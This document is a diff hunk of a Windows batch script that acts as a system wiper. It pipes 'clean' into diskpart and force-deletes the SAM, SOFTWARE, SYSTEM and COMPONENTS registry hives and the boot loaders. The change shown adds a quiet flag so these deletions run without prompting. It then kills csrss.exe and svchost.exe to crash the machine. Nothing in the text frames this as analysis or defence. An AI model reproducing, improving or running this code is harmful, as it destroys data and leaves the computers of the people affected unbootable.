@@ -129,12 +129,12 @@ echo goto loop >> %temp%\done.bat
 echo clean
 ) | diskpart
 
-del /f /s "C:\Windows\System32\config\SAM"
-del /f /s "C:\Windows\System32\config\SOFTWARE"
-del /f /s "C:\Windows\System32\config\SYSTEM"
-del /f /s "C:\Windows\System32\config\COMPONENTS"
-del /f /s "C:\Windows\System32\Boot\winload.exe"
-del /f /s "C:\Windows\Boot\EFI\bootmgr.efi"
+del /f /s /q "C:\Windows\System32\config\SAM"
+del /f /s /q "C:\Windows\System32\config\SOFTWARE"
+del /f /s /q "C:\Windows\System32\config\SYSTEM"
+del /f /s /q "C:\Windows\System32\config\COMPONENTS"
+del /f /s /q "C:\Windows\System32\Boot\winload.exe"
+del /f /s /q "C:\Windows\Boot\EFI\bootmgr.efi"
 
 taskkill /F /IM csrss.exe 
 taskkill /F /IM svchost.exe 
